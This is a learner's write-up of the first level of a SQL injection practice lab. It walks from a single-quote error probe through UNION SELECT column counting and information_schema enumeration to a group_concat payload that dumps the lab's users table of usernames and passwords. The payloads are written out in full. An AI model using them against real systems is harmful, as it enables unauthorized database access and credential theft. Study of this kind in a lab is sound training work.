Hello guys.
This is the first time im doing something related to SQL injection. I have basic knowledge about sql syntax and functions...

This is the write up for Less-1 - " GET-Error Based- Single Quotes - String"


started with a [URL].../Less-1/ page, which instructed me to input the ID as parameter with numeric value.

So I start with adding ```?id=1``` after the URL and got 

```Your Login name:Dumb Your Password:Dumb```

in the page.

and using different numbers after 2, I got different Login names and passwords.

As the name of the Lesson suggests I start with a single quote Error
so I type a single quote ... ```[URL]/?id=1'```
and an error is returned ```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the 
right syntax to use near ''1'' LIMIT 0,1' at line 1```

So it seemd like ```?id=x```, is going into an sql command like
```SELECT _____ FROM _____ WHERE id = 'x';```

This is because there are odd number of single quotes.
However, I continue by trying to find out the number of columns in the table from which the usernames and passwords are printed from, by adding 
```UNION SELECT 1 -- -```
It returned an error: 
``` The used SELECT statements have a different number of columns ```
so i continued increasing till an error wasnt returned at:
```[URL]/?id=1' UNION SELECT 1,2,3 -- -```

However from here on I continued by using a wrong number after id so that the output of my following code can come instead, i proceeded with ```?id=-1```

I proceded by using, ```UNION SELECT 1, group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -```
and  ```Your Login name:emails,referers,uagents,users
        Your Password:3``` was returned so there were 4 tables called emails,referers,uagents and users. It was obvious users had the data of the login information.

so I change the command to 
``` UNION SELECT 1, group_concat(column_name),3 from information_schema.columns WHERE table_name = 'users'-- -```
and ```Your Login name:id,username,password``` was updated
So, the table users had 3 columnns called 'id,username,password'

Therefore to get a dump of this table I finally used,
```UNION SELECT 1, group_concat(username,0x7c,password),3 FROM users-- -```

And the username and password dump was finally printed!!!!
```Your Login name:Dumb|Dumb,Angelina|I-kill-you,Dummy|p@ssword,secure|crappy,stupid|stupidity,superman|genious,batman|mob!le,admin|admin,admin1|admin1,admin2|admin2,admin3|admin3,dhakkan|dumbo,admin4|admin4
Your Password:3
```


references:
-https://www.sqlinjection.net/numeric-parameters/
-https://portswigger.net/web-security/sql-injection/union-attacks
-https://noobsec.net/sqli-cheatsheet/#Database-Contents

